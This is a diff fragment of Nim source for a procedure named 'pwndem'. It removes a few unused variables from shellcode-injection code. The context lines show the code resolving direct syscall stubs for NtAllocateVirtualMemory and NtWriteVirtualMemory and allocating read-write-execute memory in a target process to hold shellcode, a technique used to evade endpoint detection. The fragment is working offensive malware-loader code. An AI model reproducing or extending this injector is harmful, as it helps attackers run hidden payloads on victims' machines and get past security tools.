@@ -573,13 +573,10 @@ proc pwndem[byte](shellcode: openarray[byte]): void =
     var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
     
     var oldProtection: DWORD = 0
-    var cid: CLIENT_ID
-    var oa: OBJECT_ATTRIBUTES
     var tHandle: HANDLE
     var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)
     var ds: LPVOID
     
-    cid.UniqueProcess = tProcess
 
     # define NtAllocateVirtualMemory
     let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
@@ -596,7 +593,6 @@ proc pwndem[byte](shellcode: openarray[byte]): void =
     success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
     success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
   
-    cid.UniqueProcess = tProcess
 
     status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
     echo "[*] NtAllocateVirtualMemory: ", status
